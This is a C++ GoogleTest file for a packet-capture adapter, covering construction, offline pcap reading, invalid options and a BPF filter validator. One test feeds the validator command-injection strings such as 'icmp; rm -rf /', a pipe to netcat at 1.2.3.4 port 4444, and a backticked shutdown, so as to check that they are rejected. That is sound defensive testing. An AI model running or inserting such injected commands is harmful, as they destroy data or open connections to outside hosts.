#include <gtest/gtest.h>
#include "../../src/net/PcapAdapter.h"
#include <thread>
#include <chrono>
#include <fstream>

TEST(PcapAdapterTest, ConstructorValid) {
    PcapAdapter::Options opts;
    opts.iface_or_file = "lo0";
    opts.promiscuous = false;
    
    EXPECT_NO_THROW({
        PcapAdapter adapter(opts);
        EXPECT_EQ(adapter.source(), "lo0");
    });
}

TEST(PcapAdapterTest, OfflineMode) {
    PcapAdapter::Options opts;
    opts.iface_or_file = "tests/fixtures/icmp_sample.pcap";
    opts.read_offline = true;

    // Check if file exists
    std::ifstream test_file(opts.iface_or_file);
    if (!test_file.good()) {
        GTEST_SKIP() << "icmp_sample.pcap not found at: " << opts.iface_or_file;
    }
    
    PcapAdapter adapter(opts);
    
    int packet_count = 0;
    adapter.startCapture([&](const PacketMeta& meta, const uint8_t* data, size_t len) {
        packet_count++;
    });

    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    
    adapter.stopCapture();
    EXPECT_EQ(packet_count, 10);
}

TEST(PcapAdapterTest, InvalidInterface) {
    PcapAdapter::Options opts;
    opts.iface_or_file = "nonexistent999";
    opts.read_offline = false;
    
    PcapAdapter adapter(opts);
    EXPECT_THROW(adapter.startCapture([](auto,auto,auto){}), std::runtime_error);
}

TEST(PcapAdapterTest, InvalidOptions) {
    PcapAdapter::Options opts;
    opts.iface_or_file = "";  // Empty interface
    
    EXPECT_THROW({
        PcapAdapter adapter(opts);
    }, std::invalid_argument);
    
    opts.iface_or_file = "lo0";
    opts.snaplen = -1;  // Invalid snaplen
    
    EXPECT_THROW({
        PcapAdapter adapter(opts);
    }, std::invalid_argument);
}

TEST(PcapAdapterTest, BpfFilterValid) {
    EXPECT_TRUE(isValidBpfFilter("icmp"));
    EXPECT_TRUE(isValidBpfFilter("tcp port 82"));
    EXPECT_TRUE(isValidBpfFilter("host 192.168.1.1"));
    EXPECT_TRUE(isValidBpfFilter("udp and port 53"));
}

TEST(PcapAdapterTest, BpfFilterInvalidCharacters) {
    EXPECT_FALSE(isValidBpfFilter("icmp; rm -rf /"));
    EXPECT_FALSE(isValidBpfFilter("tcp | nc 1.2.3.4 4444"));
    EXPECT_FALSE(isValidBpfFilter("udp && evil"));
    EXPECT_FALSE(isValidBpfFilter("host 192.168.1.1$"));
    EXPECT_FALSE(isValidBpfFilter("`shutdown`"));
}

TEST(PcapAdapterTest, BpfFilterTooLong) {
    std::string long_filter(257, 'a');
    EXPECT_FALSE(isValidBpfFilter(long_filter));
}